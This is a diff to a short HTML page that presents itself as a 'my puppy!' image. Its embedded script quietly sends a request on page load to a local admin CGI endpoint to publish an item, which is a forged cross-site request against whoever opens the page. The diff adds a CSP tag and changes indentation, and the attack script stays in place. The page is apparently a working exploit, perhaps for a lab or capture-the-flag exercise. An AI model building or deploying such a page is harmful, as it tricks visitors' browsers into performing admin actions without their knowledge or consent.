@@ -1,11 +1,13 @@
 <html>
-	<head></head>
+	<head>
+		<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+	</head>
 	<body>
 		<img src="https://i.ytimg.com/vi/mRf3-JkwqfU/mqdefault.jpg" alt="my puppy!">
 	</body>
 	<script>
 		var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "http://0.0.0.0:8000/cgi-bin/admin.cgi?action=published&id=1", false ); 
-    xmlHttp.send( null );
+    		xmlHttp.open( "GET", "http://0.0.0.0:8000/cgi-bin/admin.cgi?action=published&id=1", false ); 
+    		xmlHttp.send( null );
 	</script>
 </html>
